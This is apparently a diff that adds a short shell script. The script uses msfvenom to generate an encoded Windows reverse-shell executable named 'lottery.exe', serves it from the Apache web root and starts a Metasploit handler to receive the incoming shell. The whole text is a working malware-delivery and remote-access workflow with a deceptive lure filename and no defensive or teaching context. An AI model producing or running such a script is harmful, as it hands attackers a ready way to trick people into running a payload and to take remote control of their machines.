@@ -1,0 +1,12 @@
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=$(hostname -I) lport=5555 -b "\x00" -e x86/shikata_ga_nai -f exe > lottery.exe
+mv lottery.exe /var/www/html/
+service apache2 start
+
+touch metasploit_tcp.rc
+echo use multi/handler >> metasploit_tcp.rc
+echo set payload windows/shell/reverse_tcp >> metasploit_tcp.rc
+echo set lhost $(hostname -I) >> metasploit_tcp.rc
+echo set lport 5555 >> metasploit_tcp.rc
+echo run >> metasploit_tcp.rc
+
+msfconsole -r metasploit_tcp.rc
